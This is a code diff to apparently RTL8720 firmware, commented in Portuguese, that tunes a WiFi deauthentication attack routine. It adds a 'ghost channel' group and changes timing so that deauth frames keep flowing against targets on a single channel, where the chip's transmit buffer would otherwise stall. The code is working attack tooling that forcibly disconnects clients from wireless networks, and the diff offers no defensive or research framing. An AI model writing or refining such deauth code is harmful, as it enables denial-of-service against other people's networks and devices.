@@ -176,6 +176,13 @@ void log_system_diagnostics(const char* context) {
 // ── Deauth ────────────────────────────────────────────────
 static int last_hw_deauth_channel = -1;
 
+// Calcula canal fantasma sempre dentro do range 1-11 (seguro FCC/ANATEL).
+// Se o alvo estiver nos canais baixos (1-5) usamos ch 11, senão ch 1.
+// Isso garante que wext_set_channel nunca recebe um canal proibido.
+static inline int ghost_channel_for(int target_ch) {
+  return (target_ch <= 5) ? 11 : 1;
+}
+
 void start_deauth() {
   DEBUG_SER_PRINT("\n[DEAUTH] >>> INICIANDO ATAQUE DEAUTH <<<\n");
   reset_tx_telemetry();
@@ -222,6 +229,25 @@ void start_deauth() {
   DEBUG_SER_PRINT("[DEAUTH] Grupos por canal formados: ");
   DEBUG_SER_PRINT(deauth_group_count);
   DEBUG_SER_PRINT("\n");
+
+  // ── Grupo fantasma para single-canal ────────────────────────────────────────
+  // Com apenas 1 grupo (1 rede, ou N redes no mesmo canal), o TX ring
+  // do RTL8720 satura em ~33 frames porque nunca há troca de canal.
+  // Solução: inserir um segundo grupo em canal diferente com 0 alvos.
+  // O código multi-canal existente alterna automaticamente:
+  //   ciclo par   → real_ch  → envia frames normalmente
+  //   ciclo ímpar → ghost_ch → wext_set_channel (sem TX, count=0)
+  // Espelha EXATAMENTE o comportamento de 2 redes em canais distintos:
+  //   1 wext_set_channel por chamada, com 70ms de gap entre elas.
+  if (deauth_group_count == 1 && deauth_group_count < MAX_CHANNELS) {
+    int ghost_ch = ghost_channel_for(deauth_groups[0].channel);
+    deauth_groups[1].channel = ghost_ch;
+    deauth_groups[1].count   = 0;  // 0 alvos = sem TX no canal fantasma
+    deauth_group_count       = 2;
+    DEBUG_SER_PRINT("[DEAUTH] Canal unico detectado. Ghost group adicionado: ch=");
+    DEBUG_SER_PRINT(ghost_ch);
+    DEBUG_SER_PRINT(" (0 alvos - apenas troca de canal para drenar TX ring)\n");
+  }
 
   for (int g = 0; g < deauth_group_count; g++) {
     DEBUG_SER_PRINT("  [Grupo ");
@@ -277,6 +303,10 @@ void run_deauth_frame() {
   if (!isDeauthing || deauth_group_count == 0) return;
 
   ChannelGroup &g = deauth_groups[current_group_idx % deauth_group_count];
+
+  // Troca de canal no início do ciclo, somente quando muda.
+  // Com o ghost group, esta troca acontece a cada 2 ciclos, separada pelo
+  // gap de 70ms do loop — idêntico ao comportamento de 2 redes em canais distintos.
   if (last_hw_deauth_channel != g.channel) {
     int ch_ret = wext_set_channel(WLAN0_NAME, g.channel);
     uint8_t verified_ch = 0;
@@ -331,12 +361,8 @@ void run_deauth_frame() {
   }
   yield();
 
-  // Pausa entre ciclos para drenar o TX ring
-  if (deauth_group_count == 1) {
-    delay(20);
-  } else {
-    delay(8);
-  }
+  // Pausa uniforme pós-ciclo
+  delay(8);
 
   current_group_idx = (current_group_idx + 1) % deauth_group_count;
 
